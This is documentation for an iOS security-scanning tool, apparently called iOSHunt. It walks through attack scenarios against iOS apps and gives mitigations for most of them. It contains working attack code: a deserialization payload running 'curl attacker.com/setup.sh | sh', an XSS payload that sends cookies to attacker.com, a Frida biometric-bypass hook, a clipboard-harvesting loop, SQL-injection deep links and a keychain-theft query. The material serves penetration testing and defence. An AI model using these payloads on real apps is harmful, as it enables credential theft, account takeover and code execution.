# Real-World Attack Scenarios Using iOSHunt Features

Dokumentasi ini menunjukkan bagaimana setiap vulnerability yang terdeteksi oleh iOSHunt dapat diexploit dalam dunia nyata.

---

## 🎯 Attack Scenario 1: Cross-App Keychain Theft

### Vulnerability
App menyimpan sensitive tokens dengan insecure keychain sharing:
- `kSecAttrAccessGroup = "group.com.company"`
- Wildcard sharing atau Team ID sharing

### Attack Flow

**Phase 1: Reconnaissance**
```bash
# Tester (pentester) runs iOSHunt
ioshunt recon com.banking.app

# Report identifies:
# ✓ Keychain Shared via App Groups: group.com.company
# ✓ CRITICAL: Keychain shared with wildcard: *
```

**Phase 2: Analysis**
```json
{
  "finding": "Keychain Shared via App Groups",
  "description": "Other apps in group can access keychain items",
  "access_group": "group.com.company",
  "impact": "CRITICAL - ANY app with same group ID can steal keychain"
}
```

**Phase 3: Dynamic Verification**
```bash
# Monitor what's being stored
ioshunt attach com.banking.app --keychain-monitor

# Output shows:
# [KEYCHAIN_ADD] Storing item with custom access group:
#   Service: access_token
#   Access Group: group.com.company
#   [!!!] CRITICAL: Wildcard access group!
```

**Phase 4: Exploitation Steps**

1. **Create Attacker App**
   ```swift
   // Attacker creates iOS app with SAME Team ID
   <key>keychain-access-groups</key>
   <array>
       <string>group.com.company</string>
   </array>
   ```

2. **Read Victim's Keychain**
   ```swift
   let query: [String: Any] = [
       kSecClass as String: kSecClassGenericPassword,
       kSecAttrService as String: "access_token",
       kSecAttrAccessGroup as String: "group.com.company",
       kSecReturnData as String: true
   ]
   var result: CFTypeRef?
   SecItemCopyMatching(query as CFDictionary, &result)
   // result contains: Victim's access token!
   ```

### Impact
- 💰 Account takeover
- 📊 Financial data theft
- 🔑 Session hijacking

### Mitigation
```swift
// DON'T: Share keychain with other apps
kSecAttrAccessGroup = "group.*"  // ✗ WRONG

// DO: Keep keychain app-specific
// Don't set kSecAttrAccessGroup at all
```

---

## 🔗 Attack Scenario 2: Deep Link Injection & Priv Escalation

### Vulnerability
App registers custom URL scheme tanpa proper input validation:
- `myapp://action?param=value`
- No whitelist, no sanitization

### Attack Flow

**Phase 1: Recon**
```bash
ioshunt recon com.socialnetwork.app

# Report shows:
# ✓ Unvalidated URL Scheme Handler: myapp://
# ✓ Sensitive URL Scheme: myapp://login (Auth-related)
# ✓ Missing Host Whitelist: myapp://
```

**Phase 2: Exploitation**

**Attack A - Account Takeover via Auth Bypass**
```bash
# Victim receives SMS:
# "Urgent: Verify your account"
# myapp://login?user=victim@email.com&token=ANYTHING

# App processes without validation → Account takeover
```

**Attack B - SQL Injection via Deep Link**
```bash
myapp://user?id=1' OR '1'='1' --
# App uses URL params in database query → Database leak
```

### Impact
- 👤 Account takeover
- 💻 Privilege escalation
- 🗄️ Database access

### Mitigation
```swift
func application(_ app: UIApplication,
                 open url: URL,
                 options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {
    guard let host = url.host,
          ["profile", "login"].contains(host) else {
        return false  // ✓ REJECT unknown hosts
    }
    guard let id = url.queryParameters["id"],
          let idInt = Int(id), idInt > 0 else {
        return false  // ✓ REJECT invalid IDs
    }
    return handleURL(url)
}
```

---

## 📦 Attack Scenario 3: Object Injection via Unsafe NSCoding

### Vulnerability
App deserializes objects tanpa NSSecureCoding:
- Uses `unarchiveObjectWithData`
- NO allowedClasses restrictions

### Attack Flow

**Phase 1: Discovery**
```bash
ioshunt recon com.ecommerce.app

# Report shows:
# ✓ Unsafe NSCoding (Possible Object Injection)
# ✓ Deprecated Deserialization API (Critical)
```

**Phase 2: Exploitation**
```swift
@implementation PayloadObject
- (id)initWithCoder:(NSCoder*)coder {
    system("curl attacker.com/setup.sh | sh");
    return [self init];
}
@end
```

### Impact
- 💻 Remote Code Execution
- 🔑 Steal encryption keys
- 📱 Persistent malware

---

## 📡 Attack Scenario 4: Background Data Exfiltration

### Vulnerability
App syncs sensitive data di background without proper security.

### Attack Flow
```bash
ioshunt recon com.finance.app

# Report shows:
# ✓ Potential Background Data Leak
# ✓ Network (Plaintext HTTP) detected
# ✓ Missing Certificate Pinning
```

**MITM Setup:**
```bash
sudo mitmproxy -p 8080
# Victim on same WiFi → Intercepts all background sync data
# Account numbers, balances, session tokens captured
```

### Impact
- 💰 Financial data theft
- 🔑 Session token capture

---

## 📦 Attack Scenario 5: Widget Data Interception

### Vulnerability
App uses shared container for WidgetKit.

### Attack Flow
```bash
ioshunt recon com.weather.app

# Report shows:
# ✓ App Extension Shared Container: group.com.weather
# ✓ WidgetKit enabled
```

Attacker creates app with same app group → reads shared container → steals location data.

### Impact
- 📍 Real-time location tracking
- 🔍 Privacy invasion

---

## 🔥 Attack Scenario 6: WebView XSS → Native Bridge Hijack (NEW)

### Vulnerability
App uses WKWebView dengan JavaScript bridge tanpa input validation:
- `evaluateJavaScript` with unsanitized content
- `WKScriptMessageHandler` exposes native APIs
- No `WKContentRuleList` (CSP)

### Attack Flow

**Phase 1: Recon**
```bash
ioshunt recon com.hybrid.app

# Report shows:
# ✓ CRITICAL: WKWebView JavaScript Bridge Injection
# ✓ HIGH: Unvalidated WKScriptMessageHandler (Native Bridge Abuse)
# ✓ HIGH: WebView loadHTMLString (Potential Stored XSS)
```

**Phase 2: Find XSS Vector**
```bash
# App loads user-generated content in WebView
# Profile bio, chat messages, or product reviews

# Attacker injects:
<img src=x onerror="
  // Step 1: Steal session cookie
  var cookie = document.cookie;

  // Step 2: Access native bridge
  window.webkit.messageHandlers.nativeBridge.postMessage({
    action: 'readKeychain',
    key: 'auth_token'
  });

  // Step 3: Exfiltrate data
  fetch('https://attacker.com/steal?cookie=' + cookie);
">
```

**Phase 3: Escalation via Native Bridge**
```javascript
// Native bridge exposes these functions without validation:
window.webkit.messageHandlers.appBridge.postMessage({
  action: "readFile",
  path: "/var/mobile/Containers/Data/Application/APP_UUID/Documents/config.json"
});
// → Reads app configuration with API keys!

window.webkit.messageHandlers.appBridge.postMessage({
  action: "makeRequest",
  url: "https://api.internal.com/admin/users",
  headers: {"Authorization": "Bearer STOLEN_TOKEN"}
});
// → Access internal APIs using stolen token!
```

### Real-World Example
```
1. E-commerce app displays product reviews in WKWebView
2. Attacker submits review with XSS payload
3. Victim opens product page → XSS fires
4. JS accesses native bridge → reads keychain auth token
5. Token sent to attacker server
6. Attacker uses token to place orders on victim's account
```

### Impact
- 🔑 Session hijacking via cookie theft
- 📱 Native API access (keychain, files, camera)
- 💰 Unauthorized transactions
- 🔓 Full account takeover

### Detection with iOSHunt
```bash
# Static: Identify WebView + bridge vulnerabilities
ioshunt recon com.hybrid.app

# Dynamic: Monitor JavaScript bridge calls
ioshunt attach com.hybrid.app --url-scheme-monitor
```

### Mitigation
```swift
// DO: Validate all JS bridge messages
func userContentController(_ controller: WKUserContentController,
                          didReceive message: WKScriptMessage) {
    guard let body = message.body as? [String: Any],
          let action = body["action"] as? String,
          ["getProfile", "setTheme"].contains(action) else {
        return  // ✓ Reject unknown actions
    }
    // Only allow safe, non-sensitive operations
}

// DO: Implement Content Security Policy
let ruleList = """
[{
    "trigger": {"url-filter": ".*"},
    "action": {"type": "block", "selector": "script[src*='evil']"}
}]
"""
```

---

## 🔓 Attack Scenario 7: Biometric Bypass → Account Takeover (NEW)

### Vulnerability
App uses FaceID/TouchID tanpa proper validation:
- `deviceOwnerAuthenticationWithBiometrics` (no passcode fallback)
- Missing `evaluatedPolicyDomainState` check
- `LAContext` not invalidated after use

### Attack Flow

**Phase 1: Recon**
```bash
ioshunt recon com.banking.app

# Report shows:
# ✓ HIGH: Biometric Auth Without Passcode Fallback
# ✓ MEDIUM: Missing Biometric Change Detection
# ✓ MEDIUM: LAContext Not Invalidated
```

**Phase 2: Biometric Enrollment Attack**
```
1. Attacker gets temporary physical access to unlocked device
2. Settings → Face ID → Set Up Alternative Appearance
3. Attacker enrolls their face as "alternative appearance"
4. App doesn't check evaluatedPolicyDomainState
5. Attacker now authenticates as victim via FaceID
6. Full access to banking app
```

**Phase 3: Frida Bypass (If Physical Access)**
```javascript
// Frida script to bypass biometric auth
var LAContext = ObjC.classes.LAContext;
Interceptor.attach(
  LAContext['- evaluatePolicy:localizedReason:reply:'].implementation, {
    onEnter: function(args) {
      // Override the reply block to always succeed
      var reply = new ObjC.Block(args[4]);
      reply.implementation = function(success, error) {
        // Always return success=true
        reply(true, null);
      };
    }
  }
);
```

**Phase 4: Context Reuse Attack**
```
1. User authenticates once with FaceID (legitimate)
2. LAContext remains valid (not invalidated)
3. Attacker takes device while app is still running
4. All subsequent biometric checks pass without re-prompting
5. Attacker accesses transfers, settings, password changes
```

### Real-World Example
```
Banking App Biometric Bypass Chain:
1. Attacker borrows victim's phone briefly
2. Enrolls fingerprint in Settings
3. Returns phone
4. Later: Opens banking app → FaceID/TouchID → Uses own biometric
5. App accepts (no enrollment change detection)
6. Transfers money, changes password
7. Victim locked out
```

### Impact
- 🏦 Unauthorized financial transactions
- 🔑 Password/PIN change
- 📱 Full account takeover
- 💰 Fund transfers to attacker

### Detection with iOSHunt
```bash
# Static analysis identifies all 3 patterns
ioshunt recon com.banking.app

# Dynamic: Monitor biometric calls
ioshunt attach com.banking.app --bypass
```

### Mitigation
```swift
// DO: Use full device auth (biometric + passcode fallback)
let context = LAContext()
context.evaluatePolicy(
    .deviceOwnerAuthentication,  // ✓ Includes passcode fallback
    localizedReason: "Authenticate to access your account"
) { success, error in
    // Handle result
}

// DO: Detect biometric enrollment changes
let context = LAContext()
context.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: nil)
let currentState = context.evaluatedPolicyDomainState

if let savedState = loadSavedState(),
   savedState != currentState {
    // ✓ Biometric changed! Require password re-authentication
    requirePasswordAuth()
}

// DO: Invalidate context after use
context.invalidate()
```

---

## 📋 Attack Scenario 8: Clipboard Data Theft (NEW)

### Vulnerability
App copies sensitive data to system clipboard tanpa expiration:
- Passwords/tokens to `UIPasteboard.general`
- No `expirationDate` set
- Cross-app clipboard access

### Attack Flow

**Phase 1: Recon**
```bash
ioshunt recon com.password-manager.app

# Report shows:
# ✓ HIGH: Sensitive Data Clipboard Exposure (password context)
# ✓ MEDIUM: Clipboard Data Without Expiration
```

**Phase 2: Exploitation**
```swift
// Attacker's background app (running in background)
// Monitors clipboard continuously

Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { _ in
    if let clipboardContent = UIPasteboard.general.string {
        // Check if it looks like a password or token
        if clipboardContent.count >= 8 &&
           clipboardContent.contains(where: { $0.isUppercase }) &&
           clipboardContent.contains(where: { $0.isNumber }) {
            // Send to attacker server
            sendToServer(clipboardContent, type: "password")
        }

        // Check for JWT tokens
        if clipboardContent.starts(with: "eyJ") {
            sendToServer(clipboardContent, type: "jwt_token")
        }
    }
}
```

**Phase 3: Attack Chain**
```
1. User opens password manager
2. Taps "Copy Password" for banking app
3. Password copied to UIPasteboard.general (no expiration!)
4. User switches to banking app, pastes password
5. Attacker's app reads clipboard → steals password
6. User forgets → password stays in clipboard for hours
7. Attacker has continuous access to stolen passwords
```

### Impact
- 🔑 Credential theft (passwords, API keys)
- 🏦 Account takeover
- 💳 Payment data exposure (copied card numbers)
- 📱 Cross-app data leakage

### Mitigation
```swift
// DO: Set expiration and local-only
UIPasteboard.general.setItems(
    [[UIPasteboard.typeAutomatic: sensitiveData]],
    options: [
        .expirationDate: Date().addingTimeInterval(30),  // ✓ Expires in 30 seconds
        .localOnly: true  // ✓ Don't sync via Handoff
    ]
)

// BETTER: Use app-specific pasteboard
let privatePasteboard = UIPasteboard.withUniqueName()
privatePasteboard.string = sensitiveData
// Only accessible within the app
```

---

## ⛓️ CHAINED ATTACK SCENARIOS (Combining Multiple Detectors)

### 🔥 Chain Attack 1: WebView XSS → Biometric Bypass → Account Takeover

**Vulnerabilities Combined:**
- WebView JS Bridge Injection (Detector 1)
- Biometric Auth Bypass (Detector 3)
- Clipboard Data Theft (Detector 5)

**Attack Flow:**
```
Step 1: XSS in WebView
  Attacker injects JS in chat message/review
  → JS accesses native bridge

Step 2: Disable Biometric via Bridge
  JS calls: nativeBridge.postMessage({action:"skipBiometric"})
  → LAContext not invalidated, stays authenticated

Step 3: Steal Credentials
  JS reads keychain via bridge → copies to clipboard
  → Attacker's app reads clipboard (no expiration)

Step 4: Full Takeover
  Attacker has auth token + biometric is bypassed
  → Changes password, transfers funds
```

**Detection with iOSHunt:**
```bash
ioshunt recon com.target.app
# Finds: WebView injection + Biometric bypass + Clipboard exposure
# All 3 findings in single report → chain attack identified
```

---

### 🔥 Chain Attack 2: Deep Link → WebView XSS → Data Exfiltration

**Vulnerabilities Combined:**
- Unvalidated URL Scheme (Existing Detector)
- WebView loadHTMLString XSS (Detector 1)
- Missing Privacy Manifest (Detector 2)
- Background Data Leak (Existing Detector)

**Attack Flow:**
```
Step 1: Craft Malicious Deep Link
  myapp://webview?url=https://attacker.com/xss.html
  → App opens attacker URL in WKWebView

Step 2: XSS Payload Loads
  xss.html contains: <script>
    // Read all UserDefaults (no privacy manifest = unaudited)
    window.webkit.messageHandlers.bridge.postMessage({
      action: "readDefaults",
      keys: ["auth_token", "user_email", "api_key"]
    });
  </script>

Step 3: Background Exfiltration
  App syncs stolen data in background (no cert pinning)
  → Data leaves device even after user closes app

Step 4: Persistent Access
  Attacker now has:
  - Auth token (from UserDefaults via bridge)
  - API key (from bridge file read)
  - Ongoing background sync (data keeps flowing)
```

**iOSHunt Report Output:**
```
[!!!] CRITICAL: WKWebView JavaScript Bridge Injection
[!!!] HIGH: Unvalidated URL Scheme Handler: myapp://
[!!!] HIGH: Missing Privacy Manifest (PrivacyInfo.xcprivacy)
[!]   Potential Background Data Leak
```

---

### 🔥 Chain Attack 3: Deprecated API + Supply Chain → Full RCE

**Vulnerabilities Combined:**
- Deprecated UIWebView (Detector 1)
- Vulnerable SDK - AFNetworking 2.x (Detector 7)
- Unsafe NSCoding Deserialization (Existing Detector)
- Missing Certificate Pinning (Existing Detector)

**Attack Flow:**
```
Step 1: MITM via Vulnerable SDK
  AFNetworking 2.x has SSL validation bypass (CVE-2015-3996)
  → Attacker intercepts HTTPS traffic on public WiFi

Step 2: Inject Malicious Response
  Attacker modifies API response to include crafted HTML
  → UIWebView loads response (no process isolation!)

Step 3: File System Access via UIWebView
  UIWebView with empty baseURL allows file:// access
  → JS reads: file:///var/mobile/.../Documents/cache.plist

Step 4: Object Injection via Cached Data
  Attacker modifies cache.plist via MITM (next sync)
  → App deserializes with unarchiveObjectWithData
  → Malicious object executes code
  → Full RCE achieved

Step 5: Persistence
  Malicious code installs background task
  → Continues exfiltrating data after attack
```

**iOSHunt Report Output:**
```
[!!!] HIGH: Deprecated UIWebView Usage
[!!!] HIGH: Vulnerable/Misconfigured SDK (AFNetworking < 3.0) — CVE-2015-3996
[!!!] CRITICAL: Unsafe NSKeyedUnarchiver Usage (Object Injection)
[!!!] CRITICAL: ATS Disabled + No Certificate Pinning
```

---

### 🔥 Chain Attack 4: Clipboard → Biometric → Keychain → Full Compromise

**Vulnerabilities Combined:**
- Clipboard Data Without Expiration (Detector 5)
- LAContext Not Invalidated (Detector 3)
- Keychain Accessible While Locked (Existing Detector)
- Missing Snapshot Protection (Detector 6)

**Attack Flow:**
```
Step 1: Shoulder Surfing via App Switcher
  No snapshot protection → sensitive data visible in app switcher
  → Attacker sees account balance, partial card numbers

Step 2: Clipboard Harvesting
  User copies OTP/password → stays in clipboard indefinitely
  → Attacker's app reads clipboard in background

Step 3: Biometric Session Reuse
  User authenticates once → LAContext stays valid
  → Attacker takes device while app is open
  → No re-authentication required for any operation

Step 4: Keychain Access While Locked
  kSecAttrAccessibleAlways → keychain readable even when locked
  → Frida extracts all tokens from keychain
  → Auth tokens, refresh tokens, API keys stolen

Step 5: Full Account Compromise
  Attacker has:
  - Visual confirmation (app switcher screenshot)
  - Clipboard data (OTP/password)
  - Active session (biometric not invalidated)
  - All keychain secrets (accessible always)
  → Game over: complete account takeover
```

---

## 📋 Exploitation Summary Table

| Scenario | Vulnerability | Tool | Exploit | Impact |
|----------|---|---|---|---|
| 1 | Keychain Sharing | keychain-monitor | Create app with same group | Account takeover |
| 2 | URL Scheme | url-scheme-monitor | Inject malicious params | Priv escalation |
| 3 | NSCoding | nscoding-monitor | Modify plist, inject object | RCE |
| 4 | Background Sync | monitor-api + MITM | Intercept traffic | Data theft |
| 5 | Widget Data | recon | Read app group container | Location leak |
| 6 | **WebView XSS** | **recon + attach** | **JS bridge injection** | **Session hijack** |
| 7 | **Biometric Bypass** | **recon + bypass** | **Enrollment/replay attack** | **Auth bypass** |
| 8 | **Clipboard Theft** | **recon** | **Background clipboard read** | **Credential theft** |
| **C1** | **WebView+Bio+Clip** | **recon** | **Chained XSS→bypass→steal** | **Full takeover** |
| **C2** | **DeepLink+XSS+BG** | **recon** | **Link→XSS→exfil** | **Data theft** |
| **C3** | **UIWebView+SDK+RCE** | **recon** | **MITM→inject→RCE** | **Device compromise** |
| **C4** | **Clip+Bio+Keychain** | **recon** | **Harvest→reuse→dump** | **Full compromise** |

---

## 🛡️ General Exploitation Tips

1. **Always Verify with iOSHunt First**
   ```bash
   ioshunt recon target.app
   ```

2. **Look for Attack Chains**
   ```bash
   # Multiple findings = potential chain attack
   # WebView + URL Scheme = Deep Link XSS
   # Biometric + Keychain = Auth bypass + data theft
   ```

3. **Use Frida Hooks for Confirmation**
   ```bash
   ioshunt attach target.app --url-scheme-monitor --keychain-monitor
   ```

4. **Test in Isolated Environment**
   ```bash
   # Use simulator or dedicated test device
   ```

---

**Remember**: These are for authorized penetration testing and security research ONLY!
